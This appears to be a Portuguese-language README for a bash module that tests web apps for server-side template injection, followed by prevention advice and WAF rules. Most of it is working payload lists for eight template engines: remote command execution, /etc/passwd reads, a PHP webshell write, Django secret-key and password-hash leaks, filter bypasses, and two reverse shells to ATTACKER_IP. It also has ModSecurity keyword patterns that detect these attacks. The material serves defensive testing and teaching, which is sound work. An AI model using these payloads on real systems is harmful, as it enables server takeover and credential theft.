# SSTI Tester - Módulo de Testes Server-Side Template Injection

## Descrição

O `ssti-tester.sh` é um módulo especializado em testes de **SSTI (Server-Side Template Injection)**. Utiliza os payloads do repositório **PayloadsAllTheThings/Server Side Template Injection** para fornecer cobertura completa dos principais template engines em Python, PHP, Java e Ruby.

## Motivação

SSTI é uma vulnerabilidade **CRÍTICA** que permite:
- **Remote Code Execution (RCE)**: Execução de comandos no servidor
- **File Read**: Leitura de arquivos sensíveis (/etc/passwd, configs)
- **File Write**: Escrita de webshells e backdoors
- **Information Disclosure**: Vazamento de secret keys, database credentials
- **Server Takeover**: Controle total do servidor

A modularização facilita:
1. **Testes Multi-Engine**: Cobertura de 8+ template engines
2. **Detecção Automática**: Payloads universais e específicos
3. **RCE Techniques**: Múltiplas técnicas de exploração
4. **Filter Bypass**: Técnicas de evasão de filtros

## Estrutura

O módulo está organizado em 9 categorias principais:

### 1. SSTI Detection (20 testes)
**Payloads Universais para Detecção**

#### Polyglot Detection:
```
${{'<%[%'"}}%\.
```
Este payload trigger erro na maioria dos template engines.

#### Mathematical Expression (Rendered):
```
{{7*7}}        # Jinja2, Django, Tornado (Python), Twig (PHP)
${7*7}         # Mako (Python), Freemarker (Java), Smarty (PHP)
#{7*7}         # Thymeleaf (Java)
<%= 7*7 %>     # ERB (Ruby), ASP.NET
*{7*7}         # Pebble (Java)
@{7*7}         # Razor (.NET)
```

**Resultado esperado**: `49`

#### Error-Based Detection:
```
{{(1/0).zxy.zxy}}
${(1/0).zxy.zxy}
```

Errors por linguagem:
| Error | Language |
|-------|----------|
| `ZeroDivisionError` | Python |
| `java.lang.ArithmeticException` | Java |
| `ReferenceError` | NodeJS |
| `Division by zero` | PHP |
| `divided by 0` | Ruby |

#### String Multiplication:
```
{{7*'7'}}      # Resultado: 7777777 (Python)
${7*'7'}       # Resultado: 7777777 (Python)
```

#### Boolean-Based Detection:
```
# Par 1: OK vs ERROR
{{(3*4/2)}}       # Deve funcionar
{{3*)2(/4}}       # Deve dar erro

# Par 2: OK vs ERROR  
{{((7*8)/(2*4))}} # Deve funcionar
{{7)(*)8)(2/(*4}} # Deve dar erro
```

Se as respostas forem diferentes, há SSTI!

### 2. SSTI Jinja2 (30 testes)
**Python/Flask Template Engine**

#### Basic Injection:
```python
{{7*7}}           # Returns: 49
{{7*'7'}}         # Returns: 7777777
{{config}}        # Flask config object
{{config.items()}} # All config variables
```

#### Class Exploration:
```python
# List all classes
{{[].__class__}}
{{''.__class__.__mro__}}
{{''.__class__.__mro__[2].__subclasses__()}}

# Access __globals__ and __builtins__
{{self.__init__.__globals__.__builtins__}}
```

#### File Read:
```python
# Using File class (offset 40)
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

# Using open() builtin
{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}

# Using config
{{config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]('/tmp/flag').read()}}
```

#### File Write:
```python
{{''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/shell.php', 'w').write('<?php system($_GET["cmd"]); ?>')}}
```

#### RCE - os.popen():
```python
# Classic
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Shorter payloads (context-free)
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}

# Shortest known RCE (using lipsum)
{{lipsum.__globals__["os"].popen('id').read()}}
```

#### RCE - subprocess.Popen:
```python
# Direct call (offset 396 may vary)
{{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}

# Using config
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```

#### RCE Without Guessing Offset:
```python
{% for x in ().__class__.__base__.__subclasses__() %}
  {% if "warning" in x.__name__ %}
    {{x()._module.__builtins__['__import__']('os').popen('id').read().zfill(417)}}
  {% endif %}
{% endfor %}
```

#### Evil Config File:
```python
# 1. Write evil config
{{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evil.cfg', 'w').write('from subprocess import check_output\nRUNCMD = check_output\n')}}

# 2. Load evil config
{{config.from_pyfile('/tmp/evil.cfg')}}

# 3. Execute command
{{config['RUNCMD']('/bin/bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"',shell=True)}}
```

#### Filter Bypass:

**Bypassing `_` (underscore)**:
```python
{{request|attr(['__','class','__']|join)}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr("__class__")}}
```

**Bypassing `[]` (brackets)**:
```python
{{request|attr(('__','class','__')|join)}}
```

**Bypassing all common filters**:
```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

### 3. SSTI Django (15 testes)
**Python Django Templates**

#### Basic Detection:
```python
{% csrf_token %}      # Causes error with Jinja2
{{7*7}}                # Works in Django
{{364|add:733}}        # Result: 1097
```

#### XSS:
```python
{{'<script>alert(1)</script>'}}         # Auto-escaped
{{'<script>alert(1)</script>'|safe}}    # Not escaped
```

#### Information Disclosure:

**Debug Info**:
```python
{% debug %}
```

**Secret Key Leak**:
```python
{{messages.storages.0.signer.key}}
{{settings.SECRET_KEY}}
```

**Admin Site URL**:
```python
{% include 'admin/base.html' %}
```

**Admin Users and Password Hashes**:
```python
{% load log %}
{% get_admin_log 10 as log %}
{% for e in log %}
  {{e.user.get_username}} : {{e.user.password}}
{% endfor %}
```

**Database Configuration**:
```python
{{settings.DATABASES}}
```

**All Settings**:
```python
{% for item in settings %}
  {{item}}
{% endfor %}
```

### 4. SSTI Mako (20 testes)
**Python Mako Templates**

#### Basic Injection:
```python
${7*7}           # Result: 49
${7*'7'}         # Result: 7777777
```

#### Direct os.system():
```python
<%
import os
x=os.popen('id').read()
%>
${x}
```

#### RCE - Direct Paths to os module:

Mako exposes `os` through multiple internal paths:

```python
${self.module.cache.util.os.system("id")}
${self.module.runtime.util.os.system("id")}
${self.template.module.cache.util.os.system("id")}
${self.module.cache.compat.inspect.os.system("id")}
${self.__init__.__globals__['util'].os.system('id')}
${self.template.__init__.__globals__['os'].system('id')}
${self.module.filters.compat.inspect.os.system("id")}
${self.module.runtime.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.util.os.system("id")}
${self.template._mmarker.module.cache.util.os.system("id")}
${self.attr._NSAttr__parent.module.cache.util.os.system("id")}
${self.context._with_template.module.cache.util.os.system("id")}
```

**Total: 40+ different paths!**

#### RCE with os.popen():
```python
${self.module.cache.util.os.popen('whoami').read()}
${self.module.cache.util.os.popen('cat /etc/passwd').read()}
```

#### Obfuscated RCE:

Generate string "id":
```python
${str().join(chr(i)for(i)in[105,100])}
```

Execute:
```python
${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}
```

Or:
```python
<%import os%>${os.popen(str().join(chr(i)for(i)in[105,100])).read()}
```

### 5. SSTI Tornado (10 testes)
**Python Tornado Templates**

#### Basic Injection:
```python
{{7*7}}
{{7*'7'}}
```

#### RCE:
```python
{{os.system('whoami')}}

{% import os %}
{{os.system('id')}}
{{os.popen('id').read()}}

{{__import__('os').system('id')}}
{{__import__('subprocess').check_output('id',shell=True)}}
```

#### Universal Payloads (also work):
```python
{{__include__('os').popen('id').read()}}
```

### 6. SSTI Twig (15 testes)
**PHP Twig Templates**

#### Basic Injection:
```php
{{7*7}}
{{7*'7'}}
{{"<script>alert(1)</script>"}}
```

#### File Read:
```php
{{'/etc/passwd'|file_excerpt(1,30)}}
{{include('/etc/passwd')}}
```

#### RCE via _self.env:
```php
# Register filter callback as 'exec'
{{_self.env.registerUndefinedFilterCallback('exec')}}
{{_self.env.getFilter('id')}}

# Other functions
{{_self.env.registerUndefinedFilterCallback('system')}}
{{_self.env.getFilter('whoami')}}

{{_self.env.registerUndefinedFilterCallback('passthru')}}
{{_self.env.getFilter('ls -la')}}
```

#### RCE via map/filter:
```php
{{['id']|map('system')|join}}
{{['id','ls']|filter('system')}}
```

#### Debug/Config:
```php
{{dump(app)}}
{{dump(_self)}}
```

#### PHP Functions:
```php
{{_self.env.registerUndefinedFilterCallback('phpinfo')}}
{{_self.env.getFilter(1)}}
```

### 7. SSTI Smarty (10 testes)
**PHP Smarty Templates**

#### Basic Injection:
```php
{7*7}
{7*'7'}
```

#### Direct PHP Execution:
```php
{php}phpinfo(){/php}
{php}system('id'){/php}
{php}echo `whoami`;{/php}
```

#### File Read:
```php
{file_get_contents('/etc/passwd')}
```

#### Static Methods:
```php
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['cmd']); ?>",true)}
```

#### Smarty Variables:
```php
# Access GET parameter
{$smarty.get.cmd}

# Usage: ?cmd=id&name={$smarty.get.cmd}
```

#### Include:
```php
{include file='/etc/passwd'}
```

#### eval:
```php
{eval var=$GLOBALS}
```

### 8. SSTI Freemarker (15 testes)
**Java Freemarker Templates**

#### Basic Injection:
```java
${7*7}
${7*'7'}
```

#### RCE via Execute:
```java
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}
${ex("whoami")}
${ex("cat /etc/passwd")}
```

#### RCE via ObjectConstructor + ProcessBuilder:
```java
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>
${value("java.lang.ProcessBuilder","ls").start()}
${value("java.lang.ProcessBuilder",["id"]).start()}
```

#### RCE via JythonRuntime:
```java
<#assign value="freemarker.template.utility.JythonRuntime"?new()>
<@value>import os;os.system('id')</@value>
```

#### Class Exploration:
```java
${''.getClass()}
${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}
```

#### File Read:
```java
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(' ')}
```

#### API Builtin:
```java
${''.?api}
```

#### Reverse Shell:
```java
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"')}
```

### 9. SSTI ERB (10 testes)
**Ruby ERB Templates**

#### Basic Injection:
```ruby
<%= 7*7 %>
<%= 7*'7' %>
```

#### RCE:
```ruby
<%= system('id') %>
<%= `id` %>
<%= %x{id} %>
<%= exec('id') %>
<%= IO.popen('id').readlines() %>
<%= Kernel.system('whoami') %>
```

#### File Operations:
```ruby
<%= File.read('/etc/passwd') %>
<%= Dir.entries('/') %>
```

## Uso

### Executar apenas testes SSTI
```bash
./head-test.sh -u https://example.com -c ssti
```

### Executar todos os testes (incluindo SSTI)
```bash
./head-test.sh -u https://example.com -c all
```

### Com velocidade TURBO
```bash
./head-test.sh -u https://example.com -c ssti --speed 5
```

### Filtrar apenas vulnerabilidades
```bash
./head-test.sh -u https://example.com -c ssti --filter fail
```

## Arquitetura

```
head-test.sh
├── source ssti-tester.sh
│   ├── test_ssti_detection()
│   ├── test_ssti_jinja2()
│   ├── test_ssti_django()
│   ├── test_ssti_mako()
│   ├── test_ssti_tornado()
│   ├── test_ssti_twig()
│   ├── test_ssti_smarty()
│   ├── test_ssti_freemarker()
│   ├── test_ssti_erb()
│   └── run_all_ssti_tests() [função principal]
└── PayloadsAllTheThings/Server Side Template Injection/
    ├── README.md
    ├── Python.md (Jinja2, Django, Mako, Tornado)
    ├── PHP.md (Twig, Smarty)
    ├── Java.md (Freemarker)
    ├── Ruby.md (ERB)
    └── Intruder/
```

## Template Engines Testados

### Python:
- ✅ **Jinja2** (Flask, FastAPI) - 30 testes
- ✅ **Django Templates** - 15 testes
- ✅ **Mako** - 20 testes
- ✅ **Tornado** - 10 testes

### PHP:
- ✅ **Twig** (Symfony) - 15 testes
- ✅ **Smarty** - 10 testes

### Java:
- ✅ **Freemarker** (Spring) - 15 testes

### Ruby:
- ✅ **ERB** (Rails) - 10 testes

### JavaScript (futuros):
- 🔲 Pug (Jade)
- 🔲 Handlebars
- 🔲 EJS

## Quantidade de Testes

**Total estimado: 170+ testes de SSTI**

Distribuídos em:
- 20 testes detection (universal)
- 30 testes Jinja2 (Python/Flask)
- 15 testes Django (Python)
- 20 testes Mako (Python)
- 10 testes Tornado (Python)
- 15 testes Twig (PHP/Symfony)
- 10 testes Smarty (PHP)
- 15 testes Freemarker (Java/Spring)
- 10 testes ERB (Ruby/Rails)
- +25 testes SSTI (já existentes no head-test.sh)

## Comparação com Ferramentas

| Ferramenta | ssti-tester.sh | tplmap | SSTImap | TInjA |
|------------|----------------|--------|---------|-------|
| **Propósito** | Hardening | Exploitation | Exploitation | Detection |
| **Velocidade** | ⚡ Muito rápido | 🐢 Lento | 🐢 Lento | ⚡ Rápido |
| **Engines** | 8 | 15+ | 15+ | 44 |
| **Automação** | Total | Semi-auto | Interactive | Total |
| **RCE** | ❌ Detec only | ✅ Full shell | ✅ Full shell | ❌ Detection |
| **Blind SSTI** | ✅ Time/Boolean | ✅ Sim | ✅ Sim | ✅ Sim |
| **Uso** | CI/CD, hardening | Pentesting | Pentesting | Scanning |

## Casos de Uso

### 1. **Hardening Validation**
Verificar se template engines estão configurados corretamente.

### 2. **CI/CD Integration**
```bash
#!/bin/bash
APP_URL="https://app.example.com"

./head-test.sh -u "$APP_URL" -c ssti --speed 5 --filter fail

if [ $? -ne 0 ]; then
    echo "❌ SSTI vulnerabilities detected!"
    exit 1
fi
```

### 3. **PDF/Email Generation Testing**
PDFs e emails geralmente usam templates:
```bash
# Test invoice generation endpoint
./head-test.sh -u "https://app.com/invoice?name={{7*7}}" -c ssti

# Test email preview
./head-test.sh -u "https://app.com/email/preview?subject={{7*7}}" -c ssti
```

### 4. **Framework Detection**
Identificar qual framework está sendo usado:
- Django: `{% csrf_token %}` funciona
- Jinja2: `{{config}}` existe
- Twig: `{{_self}}` existe
- Freemarker: `${.now}` funciona

## Severidade

SSTI é classificada como **CRÍTICA** porque:

- ✅ **RCE**: Remote Code Execution direto
- ✅ **File Read/Write**: Acesso total ao filesystem
- ✅ **Information Disclosure**: Vazamento de secrets, credentials
- ✅ **Server Takeover**: Controle total do servidor
- ✅ **Privilege Escalation**: Execução como usuário do webserver

**CVSS Score**: 
- SSTI (RCE): 9.0-10.0 (CRITICAL)
- SSTI (File Read): 7.5-8.5 (HIGH)
- SSTI (Info Disclosure): 6.5-7.5 (MEDIUM-HIGH)

## Exemplos de Exploração Real

### Jinja2 RCE (Flask)
```python
# Código vulnerável
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/')
def index():
    name = request.args.get('name', 'World')
    template = f"Hello {name}!"  # VULNERABLE!
    return render_template_string(template)
```

**Exploit**:
```bash
curl "http://localhost:5000/?name={{lipsum.__globals__['os'].popen('id').read()}}"
```

**Output**:
```
Hello uid=1000(www-data) gid=1000(www-data) groups=1000(www-data)
```

### Twig RCE (Symfony)
```php
// Código vulnerável
$template = $twig->createTemplate("Hello " . $_GET['name']);
echo $template->render();
```

**Exploit**:
```bash
curl "http://localhost/?name={{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}"
```

### Freemarker RCE (Spring)
```java
// Código vulnerável
Template template = cfg.getTemplate("hello.ftl");
template.process(model, out);
```

**Exploit**:
```java
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("whoami")}
```

## Prevenção

### 1. **Never Trust User Input**

❌ **VULNERÁVEL**:
```python
# Flask/Jinja2
template = f"Hello {user_input}!"
return render_template_string(template)
```

✅ **SEGURO**:
```python
# Use template variables
return render_template('hello.html', name=user_input)
```

### 2. **Use Sandboxed Environments**

**Jinja2** (Python/Flask):
```python
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
template = env.from_string("Hello {{name}}!")
result = template.render(name=user_input)
```

**Twig** (PHP/Symfony):
```php
$twig = new \Twig\Environment($loader, [
    'sandbox' => true,
]);
```

### 3. **Disable Dangerous Features**

**Django**:
```python
# settings.py
TEMPLATES = [{
    'OPTIONS': {
        'string_if_invalid': 'INVALID',  # Don't show variable names
        'debug': False,
    },
}]
```

**Smarty** (PHP):
```php
$smarty->security_policy = new Smarty_Security($smarty);
$smarty->enableSecurity('security_policy');
```

### 4. **Whitelist Allowed Variables**

```python
# Only allow specific variables
allowed_vars = {'username', 'email', 'date'}

def safe_render(template_str, user_vars):
    safe_vars = {k: v for k, v in user_vars.items() if k in allowed_vars}
    return render_template_string(template_str, **safe_vars)
```

### 5. **Content Security Policy**

```python
@app.after_request
def set_csp(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    return response
```

### 6. **Input Validation**

```python
import re

def validate_template_input(user_input):
    # Block template syntax
    blocked = ['{', '}', '%', '$', '#', '@', '<', '>']
    if any(char in user_input for char in blocked):
        raise ValueError("Invalid characters detected")
    return user_input
```

## Detecção e Monitoramento

### 1. **WAF Rules**

**ModSecurity**:
```nginx
# Block template syntax
SecRule ARGS "@rx (?:\{\{|\}\}|\{%|%\}|\${|\${\(|<%|%>|#\{)" \
  "id:4001,deny,status:403,msg:'SSTI Attack'"

# Block common SSTI keywords
SecRule ARGS "@rx (?:__class__|__mro__|__subclasses__|__globals__|__builtins__|popen|system|exec)" \
  "id:4002,deny,status:403,msg:'SSTI RCE Attempt'"
```

### 2. **Application Logs**

```python
import logging

# Log suspicious template rendering
if any(char in user_input for char in ['{', '}', '%', '$']):
    logging.warning(f"Suspicious template input: {user_input}")
```

### 3. **Runtime Monitoring**

Monitor for:
- Calls to `render_template_string()`
- Access to`__class__`, `__mro__`, `__globals__`
- File operations from templates
- Process creation from template context

## Próximos Passos

Melhorias futuras:

1. **JavaScript Engines**: Pug, Handlebars, EJS, Nunjucks
2. **More Java Engines**: Velocity, Thymeleaf, Pebble
3. **Go Templates**: html/template, text/template
4. **Blind SSTI**: Time-based and OOB techniques
5. **Filter Bypass Database**: More evasion techniques

## Ferramentas Complementares

- **[tplmap](https://github.com/epinna/tplmap)**: Automatic SSTI exploitation
- **[SSTImap](https://github.com/vladko312/SSTImap)**: Interactive SSTI exploitation
- **[TInjA](https://github.com/Hackmanit/TInjA)**: Fast SSTI scanner with polyglots
- **[Template Injection Table](https://github.com/Hackmanit/template-injection-table)**: Interactive reference

## Referências

- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [PortSwigger - Server-Side Template Injection](https://portswigger.net/web-security/server-side-template-injection)
- [HackTricks - SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [James Kettle - Server-Side Template Injection (PDF)](https://portswigger.net/research/server-side-template-injection)
- [Template Engines Injection 101](https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756)
- [YesWeHack - Advanced SSTI Exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)

## FAQ

**Q: Como identificar qual template engine está sendo usado?**  
A: Use payloads específicos e observe os erros. Exemplo: `{% csrf_token %}` só funciona em Django.

**Q: SSTI funciona em todos os template engines?**  
A: Não. Alguns engines são sandboxed por padrão ou não permitem code execution.

**Q: Qual a diferença entre SSTI e XSS?**  
A: SSTI executa código no **servidor** (RCE), XSS executa no **browser** do cliente.

**Q: Sandboxed environments são 100% seguros?**  
A: Não! Sandbox bypasses existem. Exemplo: Jinja2 sandbox pode ser bypassed via `lipsum.__globals__`.

**Q: SSTI é comum em APIs REST/GraphQL?**  
A: Sim! Especialmente em endpoints que geram PDFs, emails ou relatórios customizados.

**Meta final**: 100% de proteção contra SSTI e template injection!
